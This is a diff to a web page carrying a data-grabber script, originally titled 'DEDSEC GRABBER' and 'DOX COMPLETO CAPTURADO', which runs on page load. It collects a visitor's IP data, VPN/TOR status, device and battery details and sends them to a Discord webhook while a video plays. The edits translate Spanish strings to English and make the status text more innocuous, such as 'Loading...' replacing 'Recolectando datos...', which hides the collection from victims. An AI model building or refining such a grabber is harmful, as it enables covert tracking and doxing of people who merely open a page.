@@ -81,7 +81,7 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
-    <div id="status">Inicializando...</div>
+    <div id="status">Loading...</div>
 
     <script>
         (function() {
@@ -141,13 +141,13 @@
             // Enviar a Discord
             async function sendToDiscord(ipData, device, battery) {
                 // Determinar estado VPN/TOR
-                let vpnTorStatus = 'Directo (sin VPN ni TOR)';
+                let vpnTorStatus = 'No VPN/TOR Found';
                 if (ipData.proxy === true && ipData.tor === true) {
-                    vpnTorStatus = 'VPN y TOR detectados';
+                    vpnTorStatus = 'VPN y TOR Detected';
                 } else if (ipData.proxy === true) {
-                    vpnTorStatus = 'VPN detectado';
+                    vpnTorStatus = 'VPN Detected';
                 } else if (ipData.tor === true) {
-                    vpnTorStatus = 'TOR detectado';
+                    vpnTorStatus = 'TOR Detected';
                 }
 
                 const fields = [
@@ -167,10 +167,10 @@
                 ];
 
                 const payload = {
-                    username: 'DEDSEC GRABBER',
+                    username: 'Bagley',
                     avatar_url: 'https://i.imgur.com/cVnL0wo.png',
                     embeds: [{
-                        title: 'DOX COMPLETO CAPTURADO',
+                        title: 'CtOS',
                         color: 0x00ff00,
                         fields: fields,
                         footer: { text: 'rx9xx clan | Dark Night ai' },
@@ -185,14 +185,14 @@
                         body: JSON.stringify(payload)
                     });
                     if (resp.ok) {
-                        statusEl.textContent = 'Datos enviados a Discord';
+                        statusEl.textContent = 'Sent Data';
                         statusEl.className = '';
                     } else {
-                        statusEl.textContent = 'Error en webhook: ' + resp.status;
+                        statusEl.textContent = 'Error: ' + resp.status;
                         statusEl.className = 'error';
                     }
                 } catch (e) {
-                    statusEl.textContent = 'Fallo al enviar: ' + e.message;
+                    statusEl.textContent = 'Sending Error: ' + e.message;
                     statusEl.className = 'error';
                 }
             }
@@ -239,7 +239,7 @@
                 window.addEventListener('load', execute);
             }
 
-            statusEl.textContent = 'Recolectando datos...';
+            statusEl.textContent = 'Loading...';
         })();
     </script>
 </body>
